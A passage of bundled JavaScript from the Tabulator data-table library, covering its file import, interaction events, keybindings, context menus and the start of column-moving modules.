      if (attrib && typeof attrib == "object" && attrib.name && attrib.name.indexOf("tabulator-") === 0) {
        name = attrib.name.replace("tabulator-", "");
        if (typeof optionsList[name] !== "undefined") {
          options[optionsList[name]] = this._attribValue(attrib.value);
        }
      }
    }
  }
  //get value of attribute
  _attribValue(value) {
    if (value === "true") {
      return true;
    }
    if (value === "false") {
      return false;
    }
    return value;
  }
  //find column if it has already been defined
  _findCol(title) {
    var match2 = this.table.options.columns.find((column) => {
      return column.title === title;
    });
    return match2 || false;
  }
  //extract column from headers
  _extractHeaders(headers, rows2) {
    for (var index = 0; index < headers.length; index++) {
      var header = headers[index], exists2 = false, col = this._findCol(header.textContent), width;
      if (col) {
        exists2 = true;
      } else {
        col = { title: header.textContent.trim() };
      }
      if (!col.field) {
        col.field = header.textContent.trim().toLowerCase().replaceAll(" ", "_");
      }
      width = header.getAttribute("width");
      if (width && !col.width) {
        col.width = width;
      }
      this._extractOptions(header, col, this.table.columnManager.optionsList.registeredDefaults);
      this.fieldIndex[index] = col.field;
      if (col.field == this.table.options.index) {
        this.hasIndex = true;
      }
      if (!exists2) {
        this.table.options.columns.push(col);
      }
    }
  }
  //generate blank headers
  _generateBlankHeaders(headers, rows2) {
    for (var index = 0; index < headers.length; index++) {
      var header = headers[index], col = { title: "", field: "col" + index };
      this.fieldIndex[index] = col.field;
      var width = header.getAttribute("width");
      if (width) {
        col.width = width;
      }
      this.table.options.columns.push(col);
    }
  }
}
function csv(input2) {
  var data = [], row = 0, col = 0, inQuote = false;
  for (let index = 0; index < input2.length; index++) {
    let char = input2[index], nextChar = input2[index + 1];
    if (!data[row]) {
      data[row] = [];
    }
    if (!data[row][col]) {
      data[row][col] = "";
    }
    if (char == '"' && inQuote && nextChar == '"') {
      data[row][col] += char;
      index++;
      continue;
    }
    if (char == '"') {
      inQuote = !inQuote;
      continue;
    }
    if (char == "," && !inQuote) {
      col++;
      continue;
    }
    if (char == "\r" && nextChar == "\n" && !inQuote) {
      col = 0;
      row++;
      index++;
      continue;
    }
    if ((char == "\r" || char == "\n") && !inQuote) {
      col = 0;
      row++;
      continue;
    }
    data[row][col] += char;
  }
  return data;
}
function json(input2) {
  try {
    return JSON.parse(input2);
  } catch (e2) {
    console.warn("JSON Import Error - File contents is invalid JSON", e2);
    return Promise.reject();
  }
}
function array$1(input2) {
  return input2;
}
function xlsx(input2) {
  var XLSXLib = this.dependencyRegistry.lookup("XLSX"), workbook2 = XLSXLib.read(input2), sheet = workbook2.Sheets[workbook2.SheetNames[0]];
  return XLSXLib.utils.sheet_to_json(sheet, { header: 1 });
}
var defaultImporters = {
  csv,
  json,
  array: array$1,
  xlsx
};
class Import extends Module {
  static moduleName = "import";
  //load defaults
  static importers = defaultImporters;
  constructor(table) {
    super(table);
    this.registerTableOption("importFormat");
    this.registerTableOption("importReader", "text");
    this.registerTableOption("importHeaderTransform");
    this.registerTableOption("importValueTransform");
    this.registerTableOption("importDataValidator");
    this.registerTableOption("importFileValidator");
  }
  initialize() {
    this.registerTableFunction("import", this.importFromFile.bind(this));
    if (this.table.options.importFormat) {
      this.subscribe("data-loading", this.loadDataCheck.bind(this), 10);
      this.subscribe("data-load", this.loadData.bind(this), 10);
    }
  }
  loadDataCheck(data) {
    return this.table.options.importFormat && (typeof data === "string" || Array.isArray(data) && data.length && Array.isArray(data));
  }
  loadData(data, params, config, silent, previousData) {
    return this.importData(this.lookupImporter(), data).then(this.structureData.bind(this)).catch((err) => {
      console.error("Import Error:", err || "Unable to import data");
      return Promise.reject(err);
    });
  }
  lookupImporter(importFormat) {
    var importer;
    if (!importFormat) {
      importFormat = this.table.options.importFormat;
    }
    if (typeof importFormat === "string") {
      importer = Import.importers[importFormat];
    } else {
      importer = importFormat;
    }
    if (!importer) {
      console.error("Import Error - Importer not found:", importFormat);
    }
    return importer;
  }
  importFromFile(importFormat, extension, importReader) {
    var importer = this.lookupImporter(importFormat);
    if (importer) {
      return this.pickFile(extension, importReader).then(this.importData.bind(this, importer)).then(this.structureData.bind(this)).then(this.mutateData.bind(this)).then(this.validateData.bind(this)).then(this.setData.bind(this)).catch((err) => {
        this.dispatch("import-error", err);
        this.dispatchExternal("importError", err);
        console.error("Import Error:", err || "Unable to import file");
        this.table.dataLoader.alertError();
        setTimeout(() => {
          this.table.dataLoader.clearAlert();
        }, 3e3);
        return Promise.reject(err);
      });
    }
  }
  pickFile(extensions2, importReader) {
    return new Promise((resolve, reject) => {
      var input2 = document.createElement("input");
      input2.type = "file";
      input2.accept = extensions2;
      input2.addEventListener("change", (e2) => {
        var file = input2.files[0], reader = new FileReader(), valid = this.validateFile(file);
        if (valid === true) {
          this.dispatch("import-importing", input2.files);
          this.dispatchExternal("importImporting", input2.files);
          switch (importReader || this.table.options.importReader) {
            case "buffer":
              reader.readAsArrayBuffer(file);
              break;
            case "binary":
              reader.readAsBinaryString(file);
              break;
            case "url":
              reader.readAsDataURL(file);
              break;
            case "text":
            default:
              reader.readAsText(file);
          }
          reader.onload = (e3) => {
            resolve(reader.result);
          };
          reader.onerror = (e3) => {
            console.warn("File Load Error - Unable to read file");
            reject(e3);
          };
        } else {
          reject(valid);
        }
      });
      this.dispatch("import-choose");
      this.dispatchExternal("importChoose");
      input2.click();
    });
  }
  importData(importer, fileContents) {
    var data;
    this.table.dataLoader.alertLoader();
    return new Promise((resolve, reject) => {
      setTimeout(() => {
        data = importer.call(this.table, fileContents);
        if (data instanceof Promise) {
          resolve(data);
        } else {
          data ? resolve(data) : reject();
        }
      }, 10);
    });
  }
  structureData(parsedData) {
    var data = [];
    if (Array.isArray(parsedData) && parsedData.length && Array.isArray(parsedData[0])) {
      if (this.table.options.autoColumns) {
        data = this.structureArrayToObject(parsedData);
      } else {
        data = this.structureArrayToColumns(parsedData);
      }
      return data;
    } else {
      return parsedData;
    }
  }
  mutateData(data) {
    var output = [];
    if (Array.isArray(data)) {
      data.forEach((row) => {
        output.push(this.table.modules.mutator.transformRow(row, "import"));
      });
    } else {
      output = data;
    }
    return output;
  }
  transformHeader(headers) {
    var output = [];
    if (this.table.options.importHeaderTransform) {
      headers.forEach((item) => {
        output.push(this.table.options.importHeaderTransform.call(this.table, item, headers));
      });
    } else {
      return headers;
    }
    return output;
  }
  transformData(row) {
    var output = [];
    if (this.table.options.importValueTransform) {
      row.forEach((item) => {
        output.push(this.table.options.importValueTransform.call(this.table, item, row));
      });
    } else {
      return row;
    }
    return output;
  }
  structureArrayToObject(parsedData) {
    var columns = this.transformHeader(parsedData.shift());
    var data = parsedData.map((values) => {
      var row = {};
      values = this.transformData(values);
      columns.forEach((key, i2) => {
        row[key] = values[i2];
      });
      return row;
    });
    return data;
  }
  structureArrayToColumns(parsedData) {
    var data = [], firstRow = this.transformHeader(parsedData[0]), columns = this.table.getColumns();
    if (columns[0] && firstRow[0]) {
      if (columns[0].getDefinition().title === firstRow[0]) {
        parsedData.shift();
      }
    }
    parsedData.forEach((rowData) => {
      var row = {};
      rowData = this.transformData(rowData);
      rowData.forEach((value, index) => {
        var column = columns[index];
        if (column) {
          row[column.getField()] = value;
        }
      });
      data.push(row);
    });
    return data;
  }
  validateFile(file) {
    if (this.table.options.importFileValidator) {
      return this.table.options.importFileValidator.call(this.table, file);
    }
    return true;
  }
  validateData(data) {
    var result;
    if (this.table.options.importDataValidator) {
      result = this.table.options.importDataValidator.call(this.table, data);
      if (result === true) {
        return data;
      } else {
        return Promise.reject(result);
      }
    }
    return data;
  }
  setData(data) {
    this.dispatch("import-imported", data);
    this.dispatchExternal("importImported", data);
    this.table.dataLoader.clearAlert();
    return this.table.setData(data);
  }
}
class Interaction extends Module {
  static moduleName = "interaction";
  constructor(table) {
    super(table);
    this.eventMap = {
      //row events
      rowClick: "row-click",
      rowDblClick: "row-dblclick",
      rowContext: "row-contextmenu",
      rowMouseEnter: "row-mouseenter",
      rowMouseLeave: "row-mouseleave",
      rowMouseOver: "row-mouseover",
      rowMouseOut: "row-mouseout",
      rowMouseMove: "row-mousemove",
      rowMouseDown: "row-mousedown",
      rowMouseUp: "row-mouseup",
      rowTap: "row",
      rowDblTap: "row",
      rowTapHold: "row",
      //cell events
      cellClick: "cell-click",
      cellDblClick: "cell-dblclick",
      cellContext: "cell-contextmenu",
      cellMouseEnter: "cell-mouseenter",
      cellMouseLeave: "cell-mouseleave",
      cellMouseOver: "cell-mouseover",
      cellMouseOut: "cell-mouseout",
      cellMouseMove: "cell-mousemove",
      cellMouseDown: "cell-mousedown",
      cellMouseUp: "cell-mouseup",
      cellTap: "cell",
      cellDblTap: "cell",
      cellTapHold: "cell",
      //column header events
      headerClick: "column-click",
      headerDblClick: "column-dblclick",
      headerContext: "column-contextmenu",
      headerMouseEnter: "column-mouseenter",
      headerMouseLeave: "column-mouseleave",
      headerMouseOver: "column-mouseover",
      headerMouseOut: "column-mouseout",
      headerMouseMove: "column-mousemove",
      headerMouseDown: "column-mousedown",
      headerMouseUp: "column-mouseup",
      headerTap: "column",
      headerDblTap: "column",
      headerTapHold: "column",
      //group header
      groupClick: "group-click",
      groupDblClick: "group-dblclick",
      groupContext: "group-contextmenu",
      groupMouseEnter: "group-mouseenter",
      groupMouseLeave: "group-mouseleave",
      groupMouseOver: "group-mouseover",
      groupMouseOut: "group-mouseout",
      groupMouseMove: "group-mousemove",
      groupMouseDown: "group-mousedown",
      groupMouseUp: "group-mouseup",
      groupTap: "group",
      groupDblTap: "group",
      groupTapHold: "group"
    };
    this.subscribers = {};
    this.touchSubscribers = {};
    this.columnSubscribers = {};
    this.touchWatchers = {
      row: {
        tap: null,
        tapDbl: null,
        tapHold: null
      },
      cell: {
        tap: null,
        tapDbl: null,
        tapHold: null
      },
      column: {
        tap: null,
        tapDbl: null,
        tapHold: null
      },
      group: {
        tap: null,
        tapDbl: null,
        tapHold: null
      }
    };
    this.registerColumnOption("headerClick");
    this.registerColumnOption("headerDblClick");
    this.registerColumnOption("headerContext");
    this.registerColumnOption("headerMouseEnter");
    this.registerColumnOption("headerMouseLeave");
    this.registerColumnOption("headerMouseOver");
    this.registerColumnOption("headerMouseOut");
    this.registerColumnOption("headerMouseMove");
    this.registerColumnOption("headerMouseDown");
    this.registerColumnOption("headerMouseUp");
    this.registerColumnOption("headerTap");
    this.registerColumnOption("headerDblTap");
    this.registerColumnOption("headerTapHold");
    this.registerColumnOption("cellClick");
    this.registerColumnOption("cellDblClick");
    this.registerColumnOption("cellContext");
    this.registerColumnOption("cellMouseEnter");
    this.registerColumnOption("cellMouseLeave");
    this.registerColumnOption("cellMouseOver");
    this.registerColumnOption("cellMouseOut");
    this.registerColumnOption("cellMouseMove");
    this.registerColumnOption("cellMouseDown");
    this.registerColumnOption("cellMouseUp");
    this.registerColumnOption("cellTap");
    this.registerColumnOption("cellDblTap");
    this.registerColumnOption("cellTapHold");
  }
  initialize() {
    this.initializeExternalEvents();
    this.subscribe("column-init", this.initializeColumn.bind(this));
    this.subscribe("cell-dblclick", this.cellContentsSelectionFixer.bind(this));
    this.subscribe("scroll-horizontal", this.clearTouchWatchers.bind(this));
    this.subscribe("scroll-vertical", this.clearTouchWatchers.bind(this));
  }
  clearTouchWatchers() {
    var types = Object.values(this.touchWatchers);
    types.forEach((type) => {
      for (let key in type) {
        type[key] = null;
      }
    });
  }
  cellContentsSelectionFixer(e2, cell) {
    var range2;
    if (this.table.modExists("edit")) {
      if (this.table.modules.edit.currentCell === cell) {
        return;
      }
    }
    e2.preventDefault();
    try {
      if (document.selection) {
        range2 = document.body.createTextRange();
        range2.moveToElementText(cell.getElement());
        range2.select();
      } else if (window.getSelection) {
        range2 = document.createRange();
        range2.selectNode(cell.getElement());
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range2);
      }
    } catch (e3) {
    }
  }
  initializeExternalEvents() {
    for (let key in this.eventMap) {
      this.subscriptionChangeExternal(key, this.subscriptionChanged.bind(this, key));
    }
  }
  subscriptionChanged(key, added) {
    if (added) {
      if (!this.subscribers[key]) {
        if (this.eventMap[key].includes("-")) {
          this.subscribers[key] = this.handle.bind(this, key);
          this.subscribe(this.eventMap[key], this.subscribers[key]);
        } else {
          this.subscribeTouchEvents(key);
        }
      }
    } else {
      if (this.eventMap[key].includes("-")) {
        if (this.subscribers[key] && !this.columnSubscribers[key] && !this.subscribedExternal(key)) {
          this.unsubscribe(this.eventMap[key], this.subscribers[key]);
          delete this.subscribers[key];
        }
      } else {
        this.unsubscribeTouchEvents(key);
      }
    }
  }
  subscribeTouchEvents(key) {
    var type = this.eventMap[key];
    if (!this.touchSubscribers[type + "-touchstart"]) {
      this.touchSubscribers[type + "-touchstart"] = this.handleTouch.bind(this, type, "start");
      this.touchSubscribers[type + "-touchend"] = this.handleTouch.bind(this, type, "end");
      this.subscribe(type + "-touchstart", this.touchSubscribers[type + "-touchstart"]);
      this.subscribe(type + "-touchend", this.touchSubscribers[type + "-touchend"]);
    }
    this.subscribers[key] = true;
  }
  unsubscribeTouchEvents(key) {
    var noTouch = true, type = this.eventMap[key];
    if (this.subscribers[key] && !this.subscribedExternal(key)) {
      delete this.subscribers[key];
      for (let i2 in this.eventMap) {
        if (this.eventMap[i2] === type) {
          if (this.subscribers[i2]) {
            noTouch = false;
          }
        }
      }
      if (noTouch) {
        this.unsubscribe(type + "-touchstart", this.touchSubscribers[type + "-touchstart"]);
        this.unsubscribe(type + "-touchend", this.touchSubscribers[type + "-touchend"]);
        delete this.touchSubscribers[type + "-touchstart"];
        delete this.touchSubscribers[type + "-touchend"];
      }
    }
  }
  initializeColumn(column) {
    var def = column.definition;
    for (let key in this.eventMap) {
      if (def[key]) {
        this.subscriptionChanged(key, true);
        if (!this.columnSubscribers[key]) {
          this.columnSubscribers[key] = [];
        }
        this.columnSubscribers[key].push(column);
      }
    }
  }
  handle(action, e2, component) {
    this.dispatchEvent(action, e2, component);
  }
  handleTouch(type, action, e2, component) {
    var watchers = this.touchWatchers[type];
    if (type === "column") {
      type = "header";
    }
    switch (action) {
      case "start":
        watchers.tap = true;
        clearTimeout(watchers.tapHold);
        watchers.tapHold = setTimeout(() => {
          clearTimeout(watchers.tapHold);
          watchers.tapHold = null;
          watchers.tap = null;
          clearTimeout(watchers.tapDbl);
          watchers.tapDbl = null;
          this.dispatchEvent(type + "TapHold", e2, component);
        }, 1e3);
        break;
      case "end":
        if (watchers.tap) {
          watchers.tap = null;
          this.dispatchEvent(type + "Tap", e2, component);
        }
        if (watchers.tapDbl) {
          clearTimeout(watchers.tapDbl);
          watchers.tapDbl = null;
          this.dispatchEvent(type + "DblTap", e2, component);
        } else {
          watchers.tapDbl = setTimeout(() => {
            clearTimeout(watchers.tapDbl);
            watchers.tapDbl = null;
          }, 300);
        }
        clearTimeout(watchers.tapHold);
        watchers.tapHold = null;
        break;
    }
  }
  dispatchEvent(action, e2, component) {
    var componentObj = component.getComponent(), callback;
    if (this.columnSubscribers[action]) {
      if (component instanceof Cell) {
        callback = component.column.definition[action];
      } else if (component instanceof Column) {
        callback = component.definition[action];
      }
      if (callback) {
        callback(e2, componentObj);
      }
    }
    this.dispatchExternal(action, e2, componentObj);
  }
}
var defaultBindings = {
  navPrev: "shift + 9",
  navNext: 9,
  navUp: 38,
  navDown: 40,
  navLeft: 37,
  navRight: 39,
  scrollPageUp: 33,
  scrollPageDown: 34,
  scrollToStart: 36,
  scrollToEnd: 35
};
var defaultActions = {
  keyBlock: function(e2) {
    e2.stopPropagation();
    e2.preventDefault();
  },
  scrollPageUp: function(e2) {
    var rowManager = this.table.rowManager, newPos = rowManager.scrollTop - rowManager.element.clientHeight;
    e2.preventDefault();
    if (rowManager.displayRowsCount) {
      if (newPos >= 0) {
        rowManager.element.scrollTop = newPos;
      } else {
        rowManager.scrollToRow(rowManager.getDisplayRows()[0]);
      }
    }
    this.table.element.focus();
  },
  scrollPageDown: function(e2) {
    var rowManager = this.table.rowManager, newPos = rowManager.scrollTop + rowManager.element.clientHeight, scrollMax = rowManager.element.scrollHeight;
    e2.preventDefault();
    if (rowManager.displayRowsCount) {
      if (newPos <= scrollMax) {
        rowManager.element.scrollTop = newPos;
      } else {
        rowManager.scrollToRow(rowManager.getDisplayRows()[rowManager.displayRowsCount - 1]);
      }
    }
    this.table.element.focus();
  },
  scrollToStart: function(e2) {
    var rowManager = this.table.rowManager;
    e2.preventDefault();
    if (rowManager.displayRowsCount) {
      rowManager.scrollToRow(rowManager.getDisplayRows()[0]);
    }
    this.table.element.focus();
  },
  scrollToEnd: function(e2) {
    var rowManager = this.table.rowManager;
    e2.preventDefault();
    if (rowManager.displayRowsCount) {
      rowManager.scrollToRow(rowManager.getDisplayRows()[rowManager.displayRowsCount - 1]);
    }
    this.table.element.focus();
  },
  navPrev: function(e2) {
    this.dispatch("keybinding-nav-prev", e2);
  },
  navNext: function(e2) {
    this.dispatch("keybinding-nav-next", e2);
  },
  navLeft: function(e2) {
    this.dispatch("keybinding-nav-left", e2);
  },
  navRight: function(e2) {
    this.dispatch("keybinding-nav-right", e2);
  },
  navUp: function(e2) {
    this.dispatch("keybinding-nav-up", e2);
  },
  navDown: function(e2) {
    this.dispatch("keybinding-nav-down", e2);
  }
};
class Keybindings extends Module {
  static moduleName = "keybindings";
  //load defaults
  static bindings = defaultBindings;
  static actions = defaultActions;
  constructor(table) {
    super(table);
    this.watchKeys = null;
    this.pressedKeys = null;
    this.keyupBinding = false;
    this.keydownBinding = false;
    this.registerTableOption("keybindings", {});
    this.registerTableOption("tabEndNewRow", false);
  }
  initialize() {
    var bindings2 = this.table.options.keybindings, mergedBindings = {};
    this.watchKeys = {};
    this.pressedKeys = [];
    if (bindings2 !== false) {
      Object.assign(mergedBindings, Keybindings.bindings);
      Object.assign(mergedBindings, bindings2);
      this.mapBindings(mergedBindings);
      this.bindEvents();
    }
    this.subscribe("table-destroy", this.clearBindings.bind(this));
  }
  mapBindings(bindings2) {
    for (let key in bindings2) {
      if (Keybindings.actions[key]) {
        if (bindings2[key]) {
          if (typeof bindings2[key] !== "object") {
            bindings2[key] = [bindings2[key]];
          }
          bindings2[key].forEach((binding) => {
            var bindingList = Array.isArray(binding) ? binding : [binding];
            bindingList.forEach((item) => {
              this.mapBinding(key, item);
            });
          });
        }
      } else {
        console.warn("Key Binding Error - no such action:", key);
      }
    }
  }
  mapBinding(action, symbolsList) {
    var binding = {
      action: Keybindings.actions[action],
      keys: [],
      ctrl: false,
      shift: false,
      meta: false
    };
    var symbols = symbolsList.toString().toLowerCase().split(" ").join("").split("+");
    symbols.forEach((symbol) => {
      switch (symbol) {
        case "ctrl":
          binding.ctrl = true;
          break;
        case "shift":
          binding.shift = true;
          break;
        case "meta":
          binding.meta = true;
          break;
        default:
          symbol = isNaN(symbol) ? symbol.toUpperCase().charCodeAt(0) : parseInt(symbol);
          binding.keys.push(symbol);
          if (!this.watchKeys[symbol]) {
            this.watchKeys[symbol] = [];
          }
          this.watchKeys[symbol].push(binding);
      }
    });
  }
  bindEvents() {
    var self = this;
    this.keyupBinding = function(e2) {
      var code = e2.keyCode;
      var bindings2 = self.watchKeys[code];
      if (bindings2) {
        self.pressedKeys.push(code);
        bindings2.forEach(function(binding) {
          self.checkBinding(e2, binding);
        });
      }
    };
    this.keydownBinding = function(e2) {
      var code = e2.keyCode;
      var bindings2 = self.watchKeys[code];
      if (bindings2) {
        var index = self.pressedKeys.indexOf(code);
        if (index > -1) {
          self.pressedKeys.splice(index, 1);
        }
      }
    };
    this.table.element.addEventListener("keydown", this.keyupBinding);
    this.table.element.addEventListener("keyup", this.keydownBinding);
  }
  clearBindings() {
    if (this.keyupBinding) {
      this.table.element.removeEventListener("keydown", this.keyupBinding);
    }
    if (this.keydownBinding) {
      this.table.element.removeEventListener("keyup", this.keydownBinding);
    }
  }
  checkBinding(e2, binding) {
    var match2 = true;
    if (e2.ctrlKey == binding.ctrl && e2.shiftKey == binding.shift && e2.metaKey == binding.meta) {
      binding.keys.forEach((key) => {
        var index = this.pressedKeys.indexOf(key);
        if (index == -1) {
          match2 = false;
        }
      });
      if (match2) {
        binding.action.call(this, e2);
      }
      return true;
    }
    return false;
  }
}
class Menu extends Module {
  static moduleName = "menu";
  constructor(table) {
    super(table);
    this.menuContainer = null;
    this.nestedMenuBlock = false;
    this.currentComponent = null;
    this.rootPopup = null;
    this.columnSubscribers = {};
    this.registerTableOption("rowContextMenu", false);
    this.registerTableOption("rowClickMenu", false);
    this.registerTableOption("rowDblClickMenu", false);
    this.registerTableOption("groupContextMenu", false);
    this.registerTableOption("groupClickMenu", false);
    this.registerTableOption("groupDblClickMenu", false);
    this.registerColumnOption("headerContextMenu");
    this.registerColumnOption("headerClickMenu");
    this.registerColumnOption("headerDblClickMenu");
    this.registerColumnOption("headerMenu");
    this.registerColumnOption("headerMenuIcon");
    this.registerColumnOption("contextMenu");
    this.registerColumnOption("clickMenu");
    this.registerColumnOption("dblClickMenu");
  }
  initialize() {
    this.deprecatedOptionsCheck();
    this.initializeRowWatchers();
    this.initializeGroupWatchers();
    this.subscribe("column-init", this.initializeColumn.bind(this));
  }
  deprecatedOptionsCheck() {
  }
  initializeRowWatchers() {
    if (this.table.options.rowContextMenu) {
      this.subscribe("row-contextmenu", this.loadMenuEvent.bind(this, this.table.options.rowContextMenu));
      this.table.on("rowTapHold", this.loadMenuEvent.bind(this, this.table.options.rowContextMenu));
    }
    if (this.table.options.rowClickMenu) {
      this.subscribe("row-click", this.loadMenuEvent.bind(this, this.table.options.rowClickMenu));
    }
    if (this.table.options.rowDblClickMenu) {
      this.subscribe("row-dblclick", this.loadMenuEvent.bind(this, this.table.options.rowDblClickMenu));
    }
  }
  initializeGroupWatchers() {
    if (this.table.options.groupContextMenu) {
      this.subscribe("group-contextmenu", this.loadMenuEvent.bind(this, this.table.options.groupContextMenu));
      this.table.on("groupTapHold", this.loadMenuEvent.bind(this, this.table.options.groupContextMenu));
    }
    if (this.table.options.groupClickMenu) {
      this.subscribe("group-click", this.loadMenuEvent.bind(this, this.table.options.groupClickMenu));
    }
    if (this.table.options.groupDblClickMenu) {
      this.subscribe("group-dblclick", this.loadMenuEvent.bind(this, this.table.options.groupDblClickMenu));
    }
  }
  initializeColumn(column) {
    var def = column.definition;
    if (def.headerContextMenu && !this.columnSubscribers.headerContextMenu) {
      this.columnSubscribers.headerContextMenu = this.loadMenuTableColumnEvent.bind(this, "headerContextMenu");
      this.subscribe("column-contextmenu", this.columnSubscribers.headerContextMenu);
      this.table.on("headerTapHold", this.loadMenuTableColumnEvent.bind(this, "headerContextMenu"));
    }
    if (def.headerClickMenu && !this.columnSubscribers.headerClickMenu) {
      this.columnSubscribers.headerClickMenu = this.loadMenuTableColumnEvent.bind(this, "headerClickMenu");
      this.subscribe("column-click", this.columnSubscribers.headerClickMenu);
    }
    if (def.headerDblClickMenu && !this.columnSubscribers.headerDblClickMenu) {
      this.columnSubscribers.headerDblClickMenu = this.loadMenuTableColumnEvent.bind(this, "headerDblClickMenu");
      this.subscribe("column-dblclick", this.columnSubscribers.headerDblClickMenu);
    }
    if (def.headerMenu) {
      this.initializeColumnHeaderMenu(column);
    }
    if (def.contextMenu && !this.columnSubscribers.contextMenu) {
      this.columnSubscribers.contextMenu = this.loadMenuTableCellEvent.bind(this, "contextMenu");
      this.subscribe("cell-contextmenu", this.columnSubscribers.contextMenu);
      this.table.on("cellTapHold", this.loadMenuTableCellEvent.bind(this, "contextMenu"));
    }
    if (def.clickMenu && !this.columnSubscribers.clickMenu) {
      this.columnSubscribers.clickMenu = this.loadMenuTableCellEvent.bind(this, "clickMenu");
      this.subscribe("cell-click", this.columnSubscribers.clickMenu);
    }
    if (def.dblClickMenu && !this.columnSubscribers.dblClickMenu) {
      this.columnSubscribers.dblClickMenu = this.loadMenuTableCellEvent.bind(this, "dblClickMenu");
      this.subscribe("cell-dblclick", this.columnSubscribers.dblClickMenu);
    }
  }
  initializeColumnHeaderMenu(column) {
    var icon = column.definition.headerMenuIcon, headerMenuEl;
    headerMenuEl = document.createElement("span");
    headerMenuEl.classList.add("tabulator-header-popup-button");
    if (icon) {
      if (typeof icon === "function") {
        icon = icon(column.getComponent());
      }
      if (icon instanceof HTMLElement) {
        headerMenuEl.appendChild(icon);
      } else {
        headerMenuEl.innerHTML = icon;
      }
    } else {
      headerMenuEl.innerHTML = "&vellip;";
    }
    headerMenuEl.addEventListener("click", (e2) => {
      e2.stopPropagation();
      e2.preventDefault();
      this.loadMenuEvent(column.definition.headerMenu, e2, column);
    });
    column.titleElement.insertBefore(headerMenuEl, column.titleElement.firstChild);
  }
  loadMenuTableCellEvent(option, e2, cell) {
    if (cell._cell) {
      cell = cell._cell;
    }
    if (cell.column.definition[option]) {
      this.loadMenuEvent(cell.column.definition[option], e2, cell);
    }
  }
  loadMenuTableColumnEvent(option, e2, column) {
    if (column._column) {
      column = column._column;
    }
    if (column.definition[option]) {
      this.loadMenuEvent(column.definition[option], e2, column);
    }
  }
  loadMenuEvent(menu, e2, component) {
    if (component._group) {
      component = component._group;
    } else if (component._row) {
      component = component._row;
    }
    menu = typeof menu == "function" ? menu.call(this.table, e2, component.getComponent()) : menu;
    this.loadMenu(e2, component, menu);
  }
  loadMenu(e2, component, menu, parentEl, parentPopup) {
    var touch = !(e2 instanceof MouseEvent), menuEl = document.createElement("div"), popup;
    menuEl.classList.add("tabulator-menu");
    if (!touch) {
      e2.preventDefault();
    }
    if (!menu || !menu.length) {
      return;
    }
    if (!parentEl) {
      if (this.nestedMenuBlock) {
        if (this.rootPopup) {
          return;
        }
      } else {
        this.nestedMenuBlock = setTimeout(() => {
          this.nestedMenuBlock = false;
        }, 100);
      }
      if (this.rootPopup) {
        this.rootPopup.hide();
      }
      this.rootPopup = popup = this.popup(menuEl);
    } else {
      popup = parentPopup.child(menuEl);
    }
    menu.forEach((item) => {
      var itemEl = document.createElement("div"), label = item.label, disabled = item.disabled;
      if (item.separator) {
        itemEl.classList.add("tabulator-menu-separator");
      } else {
        itemEl.classList.add("tabulator-menu-item");
        if (typeof label == "function") {
          label = label.call(this.table, component.getComponent());
        }
        if (label instanceof Node) {
          itemEl.appendChild(label);
        } else {
          itemEl.innerHTML = label;
        }
        if (typeof disabled == "function") {
          disabled = disabled.call(this.table, component.getComponent());
        }
        if (disabled) {
          itemEl.classList.add("tabulator-menu-item-disabled");
          itemEl.addEventListener("click", (e3) => {
            e3.stopPropagation();
          });
        } else {
          if (item.menu && item.menu.length) {
            itemEl.addEventListener("click", (e3) => {
              e3.stopPropagation();
              this.loadMenu(e3, component, item.menu, itemEl, popup);
            });
          } else {
            if (item.action) {
              itemEl.addEventListener("click", (e3) => {
                item.action(e3, component.getComponent());
              });
            }
          }
        }
        if (item.menu && item.menu.length) {
          itemEl.classList.add("tabulator-menu-item-submenu");
        }
      }
      menuEl.appendChild(itemEl);
    });
    menuEl.addEventListener("click", (e3) => {
      if (this.rootPopup) {
        this.rootPopup.hide();
      }
    });
    popup.show(parentEl || e2);
    if (popup === this.rootPopup) {
      this.rootPopup.hideOnBlur(() => {
        this.rootPopup = null;
        if (this.currentComponent) {
          this.dispatch("menu-closed", menu, popup);
          this.dispatchExternal("menuClosed", this.currentComponent.getComponent());
          this.currentComponent = null;
        }
      });
      this.currentComponent = component;
      this.dispatch("menu-opened", menu, popup);
      this.dispatchExternal("menuOpened", component.getComponent());
    }
  }
}
class MoveColumns extends Module {
  static moduleName = "moveColumn";
  constructor(table) {
    super(table);
    this.placeholderElement = this.createPlaceholderElement();
    this.hoverElement = false;
    this.checkTimeout = false;
    this.checkPeriod = 250;
    this.moving = false;
    this.toCol = false;
    this.toColAfter = false;
    this.startX = 0;
    this.autoScrollMargin = 40;
    this.autoScrollStep = 5;
    this.autoScrollTimeout = false;
    this.touchMove = false;
    this.moveHover = this.moveHover.bind(this);
    this.endMove = this.endMove.bind(this);
    this.registerTableOption("movableColumns", false);
  }
  createPlaceholderElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-col");
    el.classList.add("tabulator-col-placeholder");
    return el;
  }
  initialize() {
    if (this.table.options.movableColumns) {
      this.subscribe("column-init", this.initializeColumn.bind(this));
      this.subscribe("alert-show", this.abortMove.bind(this));
    }
  }
  abortMove() {
    clearTimeout(this.checkTimeout);
  }
  initializeColumn(column) {
    var self = this, config = {}, colEl;
    if (!column.modules.frozen && !column.isGroup && !column.isRowHeader) {
      colEl = column.getElement();
      config.mousemove = function(e2) {
        if (column.parent === self.moving.parent) {
          if ((self.touchMove ? e2.touches[0].pageX : e2.pageX) - Helpers.elOffset(colEl).left + self.table.columnManager.contentsElement.scrollLeft > column.getWidth() / 2) {
            if (self.toCol !== column || !self.toColAfter) {
              colEl.parentNode.insertBefore(self.placeholderElement, colEl.nextSibling);
              self.moveColumn(column, true);
            }
          } else {
            if (self.toCol !== column || self.toColAfter) {
              colEl.parentNode.insertBefore(self.placeholderElement, colEl);
              self.moveColumn(column, false);
            }
          }
        }
      }.bind(self);
      colEl.addEventListener("mousedown", function(e2) {
        self.touchMove = false;
        if (e2.which === 1) {
          self.checkTimeout = setTimeout(function() {
            self.startMove(e2, column);
          }, self.checkPeriod);
        }
      });
      colEl.addEventListener("mouseup", function(e2) {
        if (e2.which === 1) {
          if (self.checkTimeout) {
            clearTimeout(self.checkTimeout);
          }
        }
      });
      self.bindTouchEvents(column);
    }
    column.modules.moveColumn = config;
  }
  bindTouchEvents(column) {
    var colEl = column.getElement(), startXMove = false, nextCol, prevCol, nextColWidth, prevColWidth, nextColWidthLast, prevColWidthLast;
    colEl.addEventListener("touchstart", (e2) => {
      this.checkTimeout = setTimeout(() => {
        this.touchMove = true;
        nextCol = column.nextColumn();
        nextColWidth = nextCol ? nextCol.getWidth() / 2 : 0;
        prevCol = column.prevColumn();
